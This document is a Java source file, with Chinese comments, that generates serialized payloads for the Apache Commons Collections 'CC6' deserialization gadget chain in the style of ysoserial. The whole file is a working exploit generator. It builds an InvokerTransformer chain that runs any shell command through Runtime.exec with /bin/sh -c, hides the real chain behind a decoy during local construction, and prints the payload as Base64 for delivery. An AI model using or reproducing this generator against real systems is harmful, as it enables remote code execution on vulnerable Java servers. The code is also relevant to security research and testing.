import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.util.Base64;

/**
 * CC6 链 payload 生成器（ysoserial 标准方式：fake 链触发 + 反射替换真链）。
 * 本地生成时不执行真命令（避免 Windows 环境无 /bin/sh 抛异常）。
 * 用法：java -cp .;commons-collections-3.1.jar CC6Gen '<command>'
 */
public class CC6Gen {
    public static void main(String[] args) throws Exception {
        String command = args.length > 0 ? args[0] : "id";
        // 真命令链：exec(String[]) 传 {/bin/sh,-c,cmd}（Runtime.exec(String) 会按空格 split，命令会碎）
        Transformer[] realTransformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String[].class},
                new Object[]{new String[]{"/bin/sh", "-c", command}})
        };
        // fake 链：无害（本地生成触发用）
        Transformer[] fakeTransformers = new Transformer[]{
            new ConstantTransformer(1)
        };
        ChainedTransformer chain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashMap<Object, Object> map = new HashMap<>();
        map.put(entry, "bar");  // 触发 fake 链（无害）
        lazyMap.remove("foo");

        // 反射替换为真命令链（序列化 payload 内嵌真链，反序列化时执行）
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chain, realTransformers);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(map);
        oos.close();
        System.out.print(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
